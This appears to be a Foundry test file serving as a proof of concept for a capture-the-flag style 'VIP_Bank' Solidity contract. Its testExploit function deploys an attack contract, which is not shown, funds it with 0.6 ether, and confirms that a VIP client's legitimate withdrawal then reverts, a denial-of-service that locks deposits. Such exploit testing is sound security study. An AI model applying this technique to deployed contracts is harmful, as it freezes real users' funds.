// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "./VIP_Bank.sol";
import "./VIP_BankAttack.sol";

contract VIP_BankPOC is Test {
  VIP_Bank target;
  address vipClient;

  function setUp() external {
    target = new VIP_Bank();

    // Create VIP client
    vipClient = makeAddr("vip");
    vm.deal(vipClient, 1 ether);
    target.addVIP(vipClient);

    require(target.VIP(vipClient), "POC: not a vip client");

    // VIP client deposit some ether
    vm.prank(vipClient);
    target.deposit{ value: 0.05 ether }();

    require(target.balances(vipClient) == 0.05 ether, "POC: vip incorrect balance");
  }

  // Confirm the emulated environment works as expected
  function testSuccessWithdraw() external {
    vm.prank(vipClient);
    target.withdraw(0.05 ether);
  }

  function testExploit() external {
    VIP_BankAttack attacker = new VIP_BankAttack();
    attacker.attack{ value: 0.6 ether }(payable(address(target)));

    vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction");
    vm.prank(vipClient);

    target.withdraw(0.05 ether);
  }
}
